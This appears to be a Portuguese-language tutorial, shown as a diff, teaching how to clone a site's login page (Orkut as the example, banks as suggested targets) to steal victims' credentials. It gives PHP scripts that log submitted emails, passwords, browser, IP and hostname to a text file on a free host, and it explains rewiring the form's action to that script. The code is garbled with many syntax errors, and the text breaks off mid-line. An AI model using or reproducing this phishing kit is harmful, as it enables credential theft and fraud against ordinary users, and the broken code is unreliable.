@@ -1,0 +1,115 @@
+Esse  tutorial vai te ensinar a  criar um a página fake de qualquer site. Página fake é uma página falsa de  login de um site, que rouba os dados das pessoas. 
+Como por exemplo uma página fake de login de um banco (Que possui a função de roubar a senha dos usuários  do banco).
+1º  Você vai precisar de um arquivo Html (ologin.html) e mais alguns arquivos php.
+                      Salva.php:      
+                      apagar.php:
+                      ler.php:
+Você vai upar todos os arquivos em um host free[Você precisa  estar registrado e conectado para ver este link] E quando a  vítima logar  na página fake , os seus 
+dados serão salvos em um arquivo "senhas.txt" no próprio host! Para ver esse arquivo acesse o arquivo "ler.php". E para apagar , acesse o arquivo "apagar.php"!
+1º entre na página de login de algum site (vamos pegar o orkut como exemplo) e salve o html como login.html! Agora, entre no bloco de notas e crie ps Php's:
+                     Salva.php:
+$nomearquivo="senhas.txt";
+  $email=$ _POST ["VALOR DO IMPUT DE LOGIN"];
+  $senha=$_POST ["VALOR DO IMPUT DE SENHA"];
+  $browser=$_SERVER ["HTTP_USER_AGENT];
+  $ip=$SERVER["REMOTE_ADDR"];
+  $hostname=gethostbyaddr($ip);
+  $data=date("Y- M- D");
+  $ hora =  date (" H: I: S")
+  $traco="
+  
+  
+  
+                ";
+ $ess= "Email:  ".$email."
+ Senha:  ".$Senha."
+ Navegador:  ".$browser."
+Ip:  ".$ip."
+Nome do Host: ".$hostname."
+Data: ".$data."
+Hora:  ".$hora."
+           ".$traco;
+$abre=@fopen("Senhas.txt","a");
+$ escreve = fwrite ($abre,$ess);
+           echo ""; 
+          ? &gt;
+          
+          
+        
+         apagar.php:
+$fd=@fopen ("Senhas.txt","W") or die  ("arquivo inexistente");
+fpassthru ($fd);
+          ?&gt;
+          
+          
+          
+          ler.php:
+$fd=@fopen ("Senhas.txt ","R") or die 
+(FALTA um arquivo no servidor!!");
+  fpassthru($fd);
+          ?&gt;
+          
+Agora, abra login.html com um editor de html, ou com o próprio bloco de notas , e ache o form de login. Esse form  é um código que, geralmente, vem nos botões de
+"Entrar" ou "Login", que dá um endereço para página ser redirecionada após o login (se o logn para autenticado, ou seja, se o usuário e a senha estiver certos.)
+Geral-mente, ele está escrito no seguinte código:
+
+O endereço do action- muda de acordo com o site. Quando for assim, adicione- um "Salva.php" no action!
+
+DICA: O Form quase sempre vem seguido do "Action", que significa uma ação que irá acontecer quando clicar no botão (ou quando a página  for atualizada). Então, para achar 
+o  form de login, voce substitui o endereço do action por salve.php. Em  geral, é assim, mas em alguns casos, em vez  de action, tem outros códigos (um deles é Onclick), 
+mas fica fácil de achar, é só pesquisar bastante no código fonte.
+No Caso do Orkt, no codigo fonte, o form está  assim:
+
+*[Voce precisa  estar registrado e conectado para ver este link.]
+É só voce trocar por: "login.php"
+Agora voce procura por perto do form, a parte do Imput. Procura o imput de usuário e o imput de senha. O imput é o campo onde voce digit a senha.
+
+DICA: A maioria dos imputs  estão com type-hidden (escondidos). Então , o imput que voce bai procurar é o  de inserir senha e login.
+Geralmente, eles tem nome de login e password. No código fonte da pagina delogin do orkut é assim:
+
+            e
+         
+Agora, voce pega os valores dos "imput name", que no exemplo, é "username" e "password", abre o salva.php. Ele deve estar assim:
+$nomearquivo="Senhas.txt";
+$email=$_POST["VALOR DO IMPUT DE LOGIN"];
+$senha=$_POST[VALOR DO IMPUT DE SENHA"];
+$browser=$_SERVER ["HTTP_USER_AGENT"];
+$ip=$_SERVER [REMOTE_ADDR"]
+$hostname=gethostbyaddr($ip);
+$data=date ("Y - M - D");
+$hora=date("H:I: S");
+$ traco = "
+
+            ";
+$ess= "Email "$email."
+Senha: " $Senha."
+Navegador: ".$browser."
+Ip: ".$ip"
+Nome do host: ".$hostname."
+data: ".$data."
+Hora: ".$hora."
+           "$traco;
+$abre=@fopen("senhas.txt","a");
+$escreve= fwrite ($abre,$ess);
+            echo "";
+            ?&gt;
+            
+Agora, voce coloca na 2ª e na 3ª Linha, entre aspas, os valores e na penultima linha, coloque endereço do login. Vai ficar assim:
+$nomearquivo="senhas.txt";
+$email:  _POST  ["email"];
+$senha: $_POST ["PASSWORD"];
+$browser=$_SERVER["HTTP_USER_USER_AGENT"];
+$Ip=$_SERVER [Remote_ADDR"];
+$hostname=gethostbyaddr ($ip);
+$data=date("Y- M- D");
+$hora=date ("H: I: S");
+$traco="
+
+            ";
+$ess= "Email: ".$email."
+Senha: ".$Senha."
+Navegador: ".browser."
+ip: ".$ip."
+Nome do host: ".$hostname."
+data :  ".$data."
+Hora: ".$
